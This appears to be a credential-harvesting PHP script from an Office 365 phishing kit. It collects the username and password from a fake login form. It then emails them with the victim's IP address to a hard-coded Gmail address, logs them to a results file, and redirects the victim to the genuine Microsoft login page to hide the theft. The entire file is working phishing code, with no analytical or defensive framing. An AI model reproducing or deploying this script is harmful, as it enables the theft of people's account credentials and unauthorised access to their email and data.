<?
$ip = getenv("REMOTE_ADDR");
$message .= "--------------Office 365 Info-----------------------\n";
$message .= "Username            : ".$_POST['u']."\n";
$message .= "Password            : ".$_POST['p']."\n";
$message .= "IP                     : ".$ip."\n";
$message .= "---------------Created BY MOET-------------\n";
$send = "jidemarvel1313@gmail.com";
$subject = "Office 365 LOGS";
$headers = "From: Office 365 <customer-support@Spammers>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);
}
$fp = fopen("results.txt","a");
fputs($fp,$message);
fclose($fp);
	
		   header("Location: https://login.microsoftonline.com/");

	 
?>